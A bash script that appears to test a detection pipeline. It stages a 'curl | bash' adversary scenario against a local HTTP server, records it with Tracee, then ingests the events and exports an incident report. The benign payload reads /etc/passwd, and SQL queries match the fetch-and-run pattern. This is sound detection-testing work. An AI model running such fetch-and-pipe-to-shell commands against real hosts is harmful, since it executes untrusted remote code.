#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TRACEE_BIN="${TRACEE_BIN:-/usr/local/bin/tracee}"
DB_PATH="${DB_PATH:-${ROOT_DIR}/db/trace-lens-h1-01.db}"
WORK_DIR="${ROOT_DIR}/runtime/h1-01-curl-bash"
TRACEE_OUTPUT="${WORK_DIR}/tracee.ndjson"
REPORT_DIR="${WORK_DIR}/exports"
CAPTURE_SECONDS="${CAPTURE_SECONDS:-18}"
HTTP_PORT="${HTTP_PORT:-18091}"

mkdir -p "${WORK_DIR}" "${REPORT_DIR}"
rm -f "${TRACEE_OUTPUT}" "${DB_PATH}"

if [[ ! -x "${TRACEE_BIN}" ]]; then
  echo "tracee binary not found or not executable: ${TRACEE_BIN}" >&2
  exit 1
fi

if ! command -v python3 >/dev/null 2>&1; then
  echo "python3 is required for the local payload server" >&2
  exit 1
fi

PAYLOAD_DIR="$(mktemp -d "${WORK_DIR}/payload.XXXXXX")"
cleanup() {
  if [[ -n "${TRACEE_PID:-}" ]]; then
    kill "${TRACEE_PID}" >/dev/null 2>&1 || true
  fi
  if [[ -n "${HTTP_PID:-}" ]]; then
    kill "${HTTP_PID}" >/dev/null 2>&1 || true
  fi
  rm -rf "${PAYLOAD_DIR}"
}
trap cleanup EXIT

cat > "${PAYLOAD_DIR}/payload.sh" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
touch /tmp/trace-lens-h1-01.marker
cat /etc/passwd >/dev/null
EOF
chmod +x "${PAYLOAD_DIR}/payload.sh"

python3 -m http.server "${HTTP_PORT}" --bind 127.0.0.1 --directory "${PAYLOAD_DIR}" \
  > "${WORK_DIR}/payload-http.log" 2>&1 &
HTTP_PID=$!

sleep 1

echo "[1/6] start Tracee capture"
"${TRACEE_BIN}" \
  --policy "${ROOT_DIR}/configs/tracee-policy.yaml" \
  --output json \
  --output option:parse-arguments \
  > "${TRACEE_OUTPUT}" 2> "${WORK_DIR}/tracee.stderr" &
TRACEE_PID=$!

for _ in $(seq 1 20); do
  if [[ -s "${TRACEE_OUTPUT}" ]]; then
    break
  fi
  sleep 1
done

if [[ ! -s "${TRACEE_OUTPUT}" ]]; then
  echo "tracee did not produce output in time" >&2
  exit 1
fi

sleep 2

PAYLOAD_URL="http://127.0.0.1:${HTTP_PORT}/payload.sh"
SCENARIO_CMD="curl -fsSL ${PAYLOAD_URL} | bash"

echo "[2/6] execute adversary command: ${SCENARIO_CMD}"
bash -lc "${SCENARIO_CMD}"

sleep 3
kill "${TRACEE_PID}" >/dev/null 2>&1 || true
wait "${TRACEE_PID}" || true
unset TRACEE_PID

echo "[3/6] initialize scenario database"
source "${HOME}/.cargo/env"
cargo run --manifest-path "${ROOT_DIR}/Cargo.toml" -- init-db --db-path "${DB_PATH}" >/dev/null

echo "[4/6] ingest Tracee output"
cargo run --manifest-path "${ROOT_DIR}/Cargo.toml" -- \
  tracee ingest \
  --input "${TRACEE_OUTPUT}" \
  --db-path "${DB_PATH}" >/dev/null

PID_QUERY="select json_extract(payload_json,'$.processId') \
from raw_events \
where source_kind='tracee' \
  and event_name='sched_process_exec' \
  and payload_json like '%${PAYLOAD_URL}%' \
  and payload_json like '%| bash%' \
order by observed_at desc limit 1;"
ROOT_PID="$(sqlite3 "${DB_PATH}" "${PID_QUERY}")"

if [[ -z "${ROOT_PID}" ]]; then
  PID_QUERY="select json_extract(payload_json,'$.processId') \
from raw_events \
where source_kind='tracee' \
  and event_name='sched_process_exec' \
  and (payload_json like '%${PAYLOAD_URL}%' or payload_json like '%/usr/bin/curl%') \
order by observed_at desc limit 1;"
  ROOT_PID="$(sqlite3 "${DB_PATH}" "${PID_QUERY}")"
fi

if [[ -z "${ROOT_PID}" ]]; then
  PID_QUERY="select json_extract(payload_json,'$.processId') \
from raw_events \
where source_kind='tracee' \
  and event_name='security_file_open' \
  and payload_json like '%trace-lens-h1-01.marker%' \
order by observed_at desc limit 1;"
  ROOT_PID="$(sqlite3 "${DB_PATH}" "${PID_QUERY}")"
fi

if [[ -z "${ROOT_PID}" ]]; then
  echo "failed to locate the root pid for H1-01 scenario" >&2
  exit 1
fi

echo "[5/6] aggregate incident for pid ${ROOT_PID}"
cargo run --manifest-path "${ROOT_DIR}/Cargo.toml" -- \
  incident "${ROOT_PID}" \
  --db-path "${DB_PATH}" \
  > "${WORK_DIR}/incident.txt"

echo "[6/6] export report and timeline"
cargo run --manifest-path "${ROOT_DIR}/Cargo.toml" -- \
  export report \
  --pid "${ROOT_PID}" \
  --db-path "${DB_PATH}" \
  --output-dir "${REPORT_DIR}" >/dev/null

cargo run --manifest-path "${ROOT_DIR}/Cargo.toml" -- \
  export timeline \
  --pid "${ROOT_PID}" \
  --db-path "${DB_PATH}" \
  --output-dir "${REPORT_DIR}" >/dev/null

echo "scenario: H1-01 curl|bash"
echo "db_path: ${DB_PATH}"
echo "tracee_output: ${TRACEE_OUTPUT}"
echo "root_pid: ${ROOT_PID}"
echo "incident_output: ${WORK_DIR}/incident.txt"
echo "report: ${REPORT_DIR}/incident-${ROOT_PID}-report.md"
echo "timeline: ${REPORT_DIR}/incident-${ROOT_PID}-timeline.json"
echo "raw_event_count: $(sqlite3 "${DB_PATH}" "select count(*) from raw_events;")"
echo "network_event_count: $(sqlite3 "${DB_PATH}" "select count(*) from raw_events where event_name in ('net_tcp_connect','tcp_connect','security_socket_connect');")"
echo "file_open_count: $(sqlite3 "${DB_PATH}" "select count(*) from raw_events where event_name='security_file_open';")"
